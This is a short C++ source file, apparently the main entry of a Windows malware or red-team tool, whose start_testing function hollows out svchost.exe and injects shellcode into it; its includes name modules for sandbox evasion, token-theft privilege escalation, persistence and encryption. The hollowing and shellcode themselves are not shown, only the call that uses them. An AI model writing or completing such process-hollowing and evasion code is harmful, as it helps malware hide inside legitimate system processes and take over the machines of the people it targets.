#include "Injection.h"
#include "Crypt.h"
#include "evasion\ProcessHollowing.h"
#include "evasion\Evasion.h"
#include "evasion\Sandbox.h"
#include "privilegeEscalation\TokenTheft.h"
#include "Persistence.h"
#include <iostream>
#include <tlhelp32.h>
#include <windows.h>


void start_testing(void) {
	ProcessHollowing hollowing;

	Injection injection;
	injection.shellcode;

	std::string targetProcess = "C:\\Windows\\System32\\svchost.exe";

	hollowing.HollowProcess(targetProcess, injection.shellcode);
}
